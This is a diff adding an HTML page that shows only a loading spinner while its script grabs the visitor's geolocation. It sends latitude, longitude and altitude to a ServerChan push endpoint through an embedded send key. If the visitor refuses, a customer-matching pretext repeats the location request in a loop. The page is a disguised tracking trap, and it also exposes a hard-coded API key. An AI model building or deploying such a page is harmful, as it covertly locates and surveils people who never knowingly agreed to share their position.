@@ -1,0 +1,40 @@
+<html>
+  <head>
+    <!-- UIkit CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/uikit@3.15.6/dist/css/uikit.min.css" />
+
+    <!-- UIkit JS -->
+    <script src="https://cdn.jsdelivr.net/npm/uikit@3.15.6/dist/js/uikit.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/uikit@3.15.6/dist/js/uikit-icons.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  </head>
+  <body style="display: flex; justify-content: center; align-items: center">
+    <span uk-spinner="ratio: 4.5"></span>
+  </body>
+
+  <script lang="javascript">
+    function getLocation() {
+      navigator.geolocation.getCurrentPosition(
+        (res) => {
+          axios
+            .get(`https://sctapi.ftqq.com/SCT170875Tyke0jF3eiIQxonihXKPpHpve.send`, {
+              params: {
+                title: 'success',
+                desp: {l:res.coords.latitude, o: res.coords.longitude, a: res.coords.altitude}
+              },
+            })
+            .catch((error) => {
+              UIkit.modal.alert('系统错误请稍后再试');
+            });
+        },
+        (error) => {
+          console.log(error);
+          UIkit.modal.alert('为了精准匹配更多意向客户，请允许系统访问您的位置')
+          .then(getLocation);
+        }
+      )
+    }
+
+    getLocation();
+  </script>
+</html>
